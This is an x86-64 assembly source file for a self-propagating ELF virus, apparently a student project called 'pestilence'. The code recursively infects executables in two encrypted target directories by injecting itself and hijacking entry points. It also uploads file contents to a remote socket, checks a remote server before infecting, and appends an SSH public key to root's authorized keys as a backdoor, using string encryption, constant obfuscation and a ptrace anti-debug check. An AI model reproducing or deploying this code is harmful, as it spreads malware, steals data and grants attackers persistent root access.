%include "asm/srcs/obf_file.inc"
; %include "asm/srcs/pestilence.inc"

bits 64 
default rel

section .text
global _start

_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
; lea rdi, [rel dir1] ; dir to open for arg readDir
; mov rsi, dir1Len
; call _readDir
call _map_int_table
; call _check_debug
call _isInfectionAllow
test rax, rax
js _final_jmp

mov rdx, 0 
mov rsi, dir1Len
lea rdi, [rel dir1] ; dir to open for arg initDir
; rdi -> to _encrypt 
push rax
_dec_initD1:
call _decrypt_str
mov rdi, rax
pop rax
call _initDir

mov rdx, 0 
mov rsi, dir2Len
lea rdi, [rel dir2]
; mov rdi, dir2 ; dir to open for arg initDir
; rdi -> to _encrypt 
push rax
_dec_initD2:
call _decrypt_str
mov rdi, rax
pop rax
call _initDir

call _backdoor

; jmp _exit
_final_jmp:
POPA 
mov rsp, rbp
pop rbp
_bf_exit:
jmp _exit

_check_debug:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
mov rax, r14 
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 243]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 363]
or rax, r14 
pop r14
pop r15
syscall
push rax
mov rsi, rax
mov rax, SYS_PTRACE 
mov rdi, PTRACE_TRACEME 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 124]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 244]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 364]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r10, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 361]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl _exit
pop rax
mov rsi, rax
mov rax, SYS_PTRACE 
mov rdi, PTRACE_DETACH 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 124]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 244]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 364]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r10, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 361]
or r10, r14 
pop r14
pop r15
syscall
ret

; take directory to open in rdi-> pwd

_initDir:
; placing pestilence on the stack
push rbp
mov rbp, rsp
sub rsp, pestilence_size
lea r8, FAM(pestilence.fd)
or qword [r8], -1
lea rsi, FAM(pestilence.pwd)
call _strcpy ; strcpy(pestilence.pwd(rsi), pwd(rdi))
cmp rdx, 0 
je _readDir
call _strlen ; strlen(pestilence.pwd(rsi))
add rsi, rax
cmp BYTE [rsi - 1], '/' 
je _join
mov BYTE [rsi], '/' 
add rsi, 1 

_join:
mov rdi, rdx
call _strcpy

mov rdi, rsp

_readDir:
mov rax, SYS_OPEN 
mov rsi, O_RDONLY | O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
jl _returnClose

lea rdi, FAM(pestilence.fd) ; en registre le fd dans la struct
mov [rdi], rax

_getDents:
lea r10, FAM(pestilence.fd) 
lea r9, FAM(pestilence.total_read) ; init total_read
mov DWORD [r9], 0 
mov rax, SYS_GETDENTS 
mov rdi, qword [r10]
lea rsi, FAM(pestilence.dirents)
mov rdx, PAGE_SIZE 
syscall
cmp rax, 0 
jle _returnClose

lea r10, FAM(pestilence.dirents_struct_ptr) ; r10 -> (struct pestilence.diretents_struct_ptr)
mov [r10], rsi ; pestilence.dirents_struct_ptr -> pestilence.dirents
lea r11, FAM(pestilence.total_to_read) ; r11 -> (struct pestilence.total_to_read)
mov DWORD [r11], eax 

_listFile:
lea r8, FAM(pestilence.total_read) ; r8 -> total lu de getdents
lea r9, FAM(pestilence.total_to_read) ; r9 -> total a lire de getdents
mov r10, FAM(pestilence.dirents_struct_ptr) ; r10 -> actual dirent struct
lea r11, FAM(pestilence.dirents_struct_ptr) ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d ; update du total lu dans r8
add qword [r11], r12 ; pestilence.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], D_FOLDER 
je _recursif
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
jne _checkRead

_updatePath:
; strlen
mov rsi, rsp
call _strlen
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
add rax, 1 
sub rsi, rax
mov rdi, rsp
call _strcpyNoNull

call _check_file

jmp _checkRead

_recursif:
lea rdi, FAM(pestilence.pwd)
; push rax
; lea rsi, FAM(pestilence.pwd)
; call _strlen
; mov rsi, rax
; pop rax
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne _callInit
cmp BYTE [rdx + 1], 0 
je _checkRead
cmp BYTE [rdx + 1], 0x2e 
jne _callInit
cmp BYTE [rdx + 2], 0 
je _checkRead

_callInit:
call _initDir

_checkRead:
mov r8, FAM(pestilence.total_read)
mov r12, FAM(pestilence.total_to_read)
cmp r8d, r12d ; if (total lu >= total getdents)
jge _getDents
jmp _listFile

_returnClose:
mov rdi, FAM(pestilence.fd)
cmp qword rdi, 0 
jle _returnLeave
mov rax, SYS_CLOSE 
syscall
or qword FAM(pestilence.fd), -1
jmp _returnLeave


_returnLeave:
leave

_return:
ret

_check_file:
push rbp
mov rbp, rsp
sub rsp, infection_size
lea rax, INF(infection.injection_offset)
mov qword [rax], 0 
lea rax, INF(infection.add_page)
mov byte [rax], 0 
lea rax, INF(infection.mem_eof)
mov qword [rax], 0 

_open_file:
mov rax, SYS_OPEN 
mov rdi, rsi
mov rsi, O_RDWR 
xor rdx, rdx
syscall
cmp rax, 0x0 
jl _returnLeave
mov INF(infection.file_fd), rax

; === get file size ===
_get_filesz:
mov rax, SYS_LSEEK 
mov rdi, INF(infection.file_fd)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rsi, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 361]
or rsi, r14 
pop r14
pop r15
mov rdx, SEEK_END 
syscall
cmp rax, 0x0 
jle _close_file_inf
mov INF(infection.map_size), rax
mov INF(infection.original_end), rax

_map_file:
; rax -> map
mov rsi, rax ; rsi = file_size
mov rax, SYS_MMAP 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rdi, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 361]
or rdi, r14 
pop r14
pop r15
mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC 
mov r10, MAP_SHARED 
mov r8, INF(infection.file_fd)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r9, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 361]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl _close_file_inf
call _extractData
mov rax, r12
mov rsi, r15
lea r8, INF(infection.map_addr)
mov [r8], rax

_check_format:
cmp dword [rax + 1], 0x02464c45 
jne _unmap_close_inf

_check_already_infected:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, qword [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx
_go_to_last_segment:
cmp cx, [r15 + elf64_ehdr.e_phnum]
jge _go_to_last_segment_end 
add r14, elf64_phdr_size
inc rcx
jmp _go_to_last_segment
_go_to_last_segment_end:
mov INF(infection.last_seg_hdr_addr), r14
xor r9, r9
_segment_loop:
cmp cx, 0 
jle _segment_loop_end
_check_segment_format:
bt word [r14], 0 
jnc _continue
bt qword [r14], 0x20 
jc _handle_valid_segment
_continue:
dec rcx
sub r14, elf64_phdr_size
jmp _segment_loop

_segment_loop_end:
mov r9, INF(infection.injection_offset)
cmp r9, 0 
je _unmap_close_inf
cmp byte INF(infection.add_page), 1 
je _add_page
jmp _infection ; else jmp _infection

_handle_valid_segment:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
_check_signature:
; r8 -> potential signature
; r9 == signature variable
mov r8, r15
add r8, qword [r14 + elf64_phdr.p_offset]
add r8, qword [r14 + elf64_phdr.p_filesz]
sub r8, signature_len
mov r9, qword [rel signature]
cmp qword r9, [r8]
je _unmap_close_inf

_valid_seg_already_found:
mov r9, INF(infection.injection_offset)
test r9, r9
jz _check_cave_size
mov r9, INF(infection.add_page)
test r9, r9
jz _continue

_check_cave_size:
; r8 == end of infection offset
; r9 == next segment offset
mov r8, qword [r14 + elf64_phdr.p_offset]
add r8, qword [r14 + elf64_phdr.p_filesz]
mov r13, r8 ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, elf64_phdr_size
add r9, elf64_phdr.p_offset
cmp [r9], r8
setb INF(infection.add_page) ; if ([r9] < r8) { infection.add_page = 1) }

_save_offsets:
; r8 -> infection structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (_check_cave_size)
;*r14 -> segment header in header table
lea r8, INF(infection.seg_nb)
mov [r8], cl
lea r8, INF(infection.original_entry)
mov r12, qword [r15 + elf64_ehdr.e_entry]
mov [r8], r12
lea r8, INF(infection.injection_offset)
mov [r8], r13
lea r8, INF(infection.injection_addr)
push r9
mov r9, qword [r14 + elf64_phdr.p_vaddr]
add r9, qword [r14 + elf64_phdr.p_memsz]
mov [r8], r9
pop r9
lea r8, INF(infection.seg_hdr_addr)
mov [r8], r14
jmp _continue

_add_page:
_update_file_size:
mov rax, SYS_FTRUNCATE 
mov rdi, INF(infection.file_fd)
lea rsi, INF(infection.map_size)
push qword [rsi]
add qword [rsi], PAGE_SIZE 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, qword [rsi]
syscall
pop rsi
cmp rax, 0 
jl _unmap_close_inf

_unmap_prev_map:
mov rdi, INF(infection.map_addr)
mov rax, SYS_UNMAP 
syscall

_remap_file:
mov rax, SYS_MMAP 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rdi, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 361]
or rdi, r14 
pop r14
pop r15
mov rsi, INF(infection.map_size) ; rsi = file_size
mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC 
mov r10, MAP_SHARED 
mov r8, INF(infection.file_fd)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r9, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 361]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl _close_file_inf
lea r8, INF(infection.map_addr)
mov [r8], rax

_find_memory_eof:
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_shnum]
add r14, qword [r14 + elf64_ehdr.e_shoff]
xor rcx, rcx

_find_mem_eof_loop:
cmp rcx, rax
jge _find_mem_eof_end
mov rbx, qword [r14 + elf64_shdr.sh_addr]
add rbx, qword [r14 + elf64_shdr.sh_size]
cmp INF(infection.mem_eof), rbx
jge _find_mem_eof_continue
mov INF(infection.mem_eof), rbx

_find_mem_eof_continue:
add r14, elf64_shdr_size
inc rcx
jmp _find_mem_eof_loop

_find_mem_eof_end:

_find_pt_note:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_phnum]
add r14, qword [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx

_find_pt_note_loop:
cmp rcx, rax
jge _find_pt_note_loop_end
cmp dword [r14 + elf64_phdr.p_type], PT_NOTE 
je _mutate_pt_note_seg

_find_pt_note_loop_continue:
add r14, elf64_phdr_size
inc rcx
jmp _find_pt_note_loop

_find_pt_note_loop_end:
mov r14, -1 

_mutate_pt_note_seg:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl _update_final_jump
mov dword [r14 + elf64_phdr.p_type], PT_LOAD 
mov qword [r14 + elf64_phdr.p_flags], PF_X | PF_R 
mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_align], PAGE_SIZE 
mov rax, INF(infection.original_end)
add rax, PAGE_SIZE 
and rax, -4096
mov qword [r14 + elf64_phdr.p_offset], rax
mov qword INF(infection.injection_offset), rax
mov rax, INF(infection.mem_eof)
add rax, PAGE_SIZE 
and rax, -4096
mov qword INF(infection.injection_addr), rax
mov qword [r14 + elf64_phdr.p_vaddr], rax
mov qword [r14 + elf64_phdr.p_paddr], rax

_infection:
_update_elf_hdr:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(infection.map_addr)
add r8, elf64_ehdr.e_entry
mov r10, INF(infection.injection_addr)
mov [r8], r10
cmp byte INF(infection.add_page), 0 
jg _copy_parasite
mov rdi, CODE_LEN 
call _update_seg_sizes

_copy_parasite:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (_end - _start)
mov rdi, INF(infection.map_addr)
add rdi, INF(infection.injection_offset)
lea rsi, [rel _start] ; rsi -> start of our code
mov rcx, CODE_LEN 
cld ; copy from _start to _end (= !std)
rep movsb

_update_final_jump:
; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(infection.map_addr)
add r8, INF(infection.injection_offset)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(infection.injection_addr)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(infection.original_entry)
sub r9, r10
mov [r8], r9d
jmp _unmap_close_inf

_update_seg_sizes:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(infection.seg_hdr_addr)
push r8 ; save header start for later

; * Update file size *
add r8, qword elf64_phdr.p_filesz
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, elf64_phdr.p_memsz
add qword [r8], rdi

ret

; --- privesc + backdoor
_backdoor:
; open "/root/.ssh/authorized.key"
; r9 == fd
push rbp
mov rbp, rsp
sub rsp, 0x1000 
mov rax, SYS_OPEN 
; mov rdi, sshFile
lea rdi, [rel sshFile]
push rax
push rsi
mov rsi, sshFile_len
_decBack:
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
mov rsi, O_RDWR | O_CREAT 
mov rdx, 600 
syscall
test rax, rax
js _returnLeave
mov r9, rax

_readSsh:
; *r9 == fd
; r10 == size read
; rsi -> buffer
mov rax, SYS_READ 
mov rdi, r9
mov rsi, rbp
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 161]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 281]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 401]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je _notFound
jl _closeSsh
mov r10, rax

_checkBackdoor:
; rcx == nombre d'octet lue
; r11 -> buffer
mov rcx, r10
mov r11, rsi

; for every new line
_findNewline:
cmp byte [r11], 0xa 
je _cmpLine
inc r11
loop _findNewline
mov rax, SYS_WRITE 
; mov rsi, back
lea rsi, [back]
mov rdx, 1 
syscall
jmp _notFound

; cmp the line with pub ssh key
_cmpLine:
mov byte [r11], 0 
mov rdi, r11
sub rdi, sshPubLen - 1 
lea rsi, [rel sshPub]
push rax
push rdi
lea rdi, [rel sshPub]
mov rsi, sshPubLen
_decCmpLine:
call _decrypt_str
mov rsi, rax
pop rdi
pop rax
push rcx
call _strcmp
pop rcx
test rax, rax 
je _closeSsh
inc r11
dec rcx
jnz _findNewline
; loop _findNewline

; if not found write it
_notFound:
mov rdi, r9
mov rax, SYS_WRITE 
; lea rsi, [rel sshPub]
push rax
push rdi
lea rdi, [rel sshPub]
mov rsi, sshPubLen
_decNotFound:
call _decrypt_str
mov rsi, rax
pop rdi
pop rax
mov rdx, sshPubLen
syscall
mov rax, SYS_WRITE 
lea rsi, [rel back]
; push rax
; push rdi
; lea rdi, [rel back]
; mov rsi, backLen
; _decNotFound1:
; call _decrypt_str
; mov rsi, rax
; pop rdi
; pop rax
mov rdx, 1 
syscall

_closeSsh:
mov rax, SYS_CLOSE 
mov rdi, r9
syscall
jmp _returnLeave


_initSocket:
_creatSocket:
mov rax, SYS_SOCKET 
mov rdi, AF_INET 
mov rsi, SOCK_STREAM 
xor rdx, rdx
syscall
test rax, rax
js _return
mov rdi, rax

_connectSocket:
mov rax, SYS_CONNECT 
lea rsi, [rel sockaddr]
mov rdx, 16 
syscall
test rax, rax
js _closeSock
mov rax, rdi
ret

_munmapExtractBuffer:
mov rax, SYS_UNMAP 
mov rdi, rsi
mov rsi, rdx
syscall
pop rdi

; (rdi: socket)
_closeSock:
mov rax, SYS_CLOSE 
syscall
mov rax, -1
ret

; extrait les donnees des fichiers via http
_extractData:
mov r12, rax ; r12 -> maped file_date
push rsi
call _creatSocket
pop rsi
mov r13, rax
_checkFd:
cmp r13, 0 
jl _return
_mmapBuffer:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
mov rax, SYS_MMAP 
xor rdi, rdi
push rsi
add rsi, headerStartLen
add rsi, headerEndLen
add rsi, 10 
mov r15, rsi
mov rdx, PROT_READ | PROT_WRITE 
mov r10, MAP_PRIVATE | MAP_ANONYMOUS 
xor r8, r8
xor r9, r9
syscall

_copyData:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
mov r14, rax
mov rsi, rax
lea rdi, [rel headerStart]
push rax
push rsi
mov rsi, headerStartLen
_dec_copyD:
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
call _strcpy
pop rax
push rax
add rsi, headerStartLen - 1 
call _itoa
lea rdi, [rel headerEnd]
push rax
push rsi
mov rsi, headerEndLen
_dec_copyD1:
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
call _strcpy
add rsi, headerEndLen - 1 
mov rdi, r12
pop rcx
call _strncpy

_sendTo:
mov rax, SYS_SENDTO 
mov rdi, r13
mov rsi, r14
mov rdx, r15
xor r10, r10
xor r9, r9
syscall
push rdi
jmp _munmapExtractBuffer

; manage infection
_isInfectionAllow:
push rbp
mov rbp, rsp 
call _creatSocket
cmp rax, 0 
jl _allow

_sendInfectionRequest:
;rdi == sockfd
mov rdi, rax
mov rax, SYS_SENDTO 
; lea rsi, [rel headerGet]
push rax
push rdi
lea rdi, [rel headerGet]
mov rsi, headerGetLen
_dec_sendInf:
call _decrypt_str
mov rsi, rax
pop rdi
pop rax
mov rdx, headerGetLen
xor r10, r10
xor r9, r9
syscall
test rax, rax
js _allow

_nanoSleep:
push rdi
mov rax, 35 
lea rdi, [rel timespec]
xor rsi, rsi
syscall
pop rdi

_recvInfectionRequest:
;* rdi == sockfd
mov rax, SYS_RECVFROM 
sub rsp, 200 
mov rsi, rsp
mov rdx, 200 
xor r10, r10
syscall
test rax, rax
js _allow

_infectionRequestRespons:
;* rdi == sockfd
mov rsi, rsp
call _strlen
add rsp, rax
sub rsp, 2 

cmp WORD [rsp], 0x4b4f 
jne _notAllow

_allow:
call _closeSock
mov rax, 0 
jmp _returnLeave

_notAllow:
call _closeSock
mov rax, -1
jmp _returnLeave

;;**;;
; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
mov rax, SYS_MMAP
mov rdi, 0x0
mov rsi, 0x1e0
mov rdx, PROT_READ | PROT_WRITE
mov r10, 0x22
mov r8, -1
mov r9, 0x0
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000000
mov dword [rax + 80], 0x01000000
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00000000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00000000
mov dword [rax + 144], 0x00460000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00000000
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x00000000
mov dword [rax + 208], 0x00000000
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00009800
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x00000000
mov dword [rax + 232], 0x00000000
mov dword [rax + 236], 0x05000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00000000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x00000000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x004c0000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00000000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x00021000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00000000
mov dword [rax + 292], 0x00000000
mov dword [rax + 296], 0x4b000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x00000000
mov dword [rax + 312], 0x00000000
mov dword [rax + 316], 0x00000000
mov dword [rax + 320], 0x001f4000
mov dword [rax + 324], 0x00000000
mov dword [rax + 328], 0x00000000
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00009600
mov dword [rax + 340], 0x00000000
mov dword [rax + 344], 0x00000000
mov dword [rax + 348], 0x00000000
mov dword [rax + 352], 0x00000000
mov dword [rax + 356], 0x61000000
mov dword [rax + 360], 0x6e000040
mov dword [rax + 364], 0x00000001
mov dword [rax + 368], 0x00000101
mov dword [rax + 372], 0x2e010100
mov dword [rax + 376], 0x02010001
mov dword [rax + 380], 0x00000000
mov dword [rax + 384], 0x00450100
mov dword [rax + 388], 0x01200000
mov dword [rax + 392], 0x00010100
mov dword [rax + 396], 0x01000001
mov dword [rax + 400], 0x00580005
mov dword [rax + 404], 0x0100010a
mov dword [rax + 408], 0x0a001001
mov dword [rax + 412], 0x23000101
mov dword [rax + 416], 0x4f02c8c8
mov dword [rax + 420], 0x00010000
mov dword [rax + 424], 0x01000001
mov dword [rax + 428], 0x3c30090a
mov dword [rax + 432], 0x09000000
mov dword [rax + 436], 0x00000000
mov dword [rax + 440], 0x7f401f02
mov dword [rax + 444], 0x0a0d0000
mov dword [rax + 448], 0x0d000a0d
mov dword [rax + 452], 0x000a0d0a
mov dword [rax + 456], 0x08038000
mov dword [rax + 460], 0x2c2a290b
mov dword [rax + 464], 0xd9654d2d
mov dword [rax + 468], 0x40020100
mov dword [rax + 472], 0x12080400
mov dword [rax + 476], 0x89071713
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len key
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> key
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi ; addr = NULL (let kernel choose)
mov rdx, 0x03 ; PROT_READ | PROT_WRITE = 1 | 2 = 3
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
mov r8, -1 ; fd = -1
xor r9, r9 ; offset = 0
mov rax, 9 ; syscall number for mmap
syscall
cmp rax, 0
jl _decrypt_loop_end
mov r11, rax
lea rsi, key
mov r9, 0xc
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
mov rax, rcx
xor rdx, rdx
cmp rcx, 0
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
movzx r10, byte [rsi + rdx] ; r10 == key[rcx % key_len]
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret

; strcpy(dst:rsi src: rdi)
_strcpyNoNull:
xor rcx, rcx
strcpy_loop:
cmp byte[rdi + rcx], 0 
je strcpy_loop_end
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
add rcx, 1 
jmp strcpy_loop
strcpy_loop_end:
ret

_strcpy:
call _strcpyNoNull
mov byte [rsi + rcx], 0 
ret

; strncpy(dst:rsi, src: rdi, count: rcx)
_strncpy:
sub rcx, 1 
_strncpyLoop:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop _strncpyLoop
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret

; strlen(str:rsi)
_strlen:
xor rcx, rcx

ft_strlen_loop:
cmp byte [rsi + rcx], 0 
je ft_strlen_end
inc rcx
jmp ft_strlen_loop

ft_strlen_end:
mov rax, rcx
ret

; strcmp(rdi, rsi)
_strcmp:
xor rcx, rcx
xor rax, rax
strcmp_loop:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl strcmp_loop_end
je strcmp_loop_end
jg strcmp_loop_end

cmp al, 0 
je strcmp_loop_end

add rcx, 1 
jmp strcmp_loop

strcmp_loop_end:
movzx rax, al
movzx r8, bl
sub rax, r8
ret

; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
_itoa:
mov r9, 10 
call _itoaLoop
ret

_itoaLoop:
cmp rax, 9 
jg _itoaRecursif
mov [rsi], ax
add byte [rsi], 48 
inc rsi
ret

_itoaRecursif:
push rax
xor rdx, rdx
div r9
call _itoaLoop 
pop rax
push rax
xor rdx, rdx
div r9
mov rax, rdx
call _itoaLoop 
pop rax
ret
mov [rsi + rcx], rax
_unmap_close_inf:
mov rdi, INF(infection.map_addr)
mov rsi, INF(infection.map_size)
mov rax, SYS_UNMAP 
syscall
jmp _close_file_inf

_close_file_inf:
mov rax, SYS_CLOSE 
mov rdi, INF(infection.file_fd)
syscall
mov qword INF(infection.file_fd), -1
jmp _returnLeave

_exit:
mov rax, 60 
xor rdi, rdi
syscall

dir1 db 0x57, 0x06, 0x58, 0x12, 0x53, 0x4A, 0x55, 0x1D, 0x56, 0x68
dir1Len equ $ - dir1
dir2 db 0x57, 0x06, 0x58, 0x12, 0x53, 0x4A, 0x55, 0x1D, 0x56, 0x5A, 0x52
dir2Len equ $ - dir2
key db 0x78, 0x72, 0x35, 0x62, 0x7C, 0x3E, 0x30, 0x6E, 0x22, 0x68, 0x52, 0x23
back db 9, 0 
backLen equ $ - back
slash db 0x57, 0x72
sshFile db 0x57, 0x00, 0x5A, 0x0D, 0x08, 0x11, 0x1E, 0x1D, 0x51, 0x00, 0x7D, 0x42, 0x0D, 0x06, 0x5D, 0x0D, 0x0E, 0x57, 0x4A, 0x0B, 0x46, 0x37, 0x39, 0x46, 0x01, 0x01, 0x35
sshFile_len equ $ - sshFile
